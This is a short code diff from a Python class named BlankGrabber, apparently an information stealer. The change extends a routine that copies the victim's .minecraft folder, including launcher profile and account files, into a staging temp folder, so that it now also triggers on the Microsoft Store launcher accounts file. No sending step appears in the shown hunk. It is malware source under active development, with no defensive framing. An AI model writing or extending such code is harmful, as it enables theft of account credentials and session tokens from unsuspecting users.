@@ -758,7 +758,7 @@ class BlankGrabber:
             minecraftDir = os.path.join(os.getenv("appdata"), ".minecraft")
             copyToDir = os.path.join(self.TempFolder, "Games", "Minecraft")
 
-            if os.path.isfile(os.path.join(minecraftDir, "launcher_profiles.json")):
+            if any([os.path.isfile(os.path.join(minecraftDir, filename)) for filename in ("launcher_profiles.json", "launcher_accounts_microsoft_store.json")]):
                 for name in os.listdir(minecraftDir):
                     filePath = os.path.join(minecraftDir, name)
                     copyTo = os.path.join(copyToDir, name)
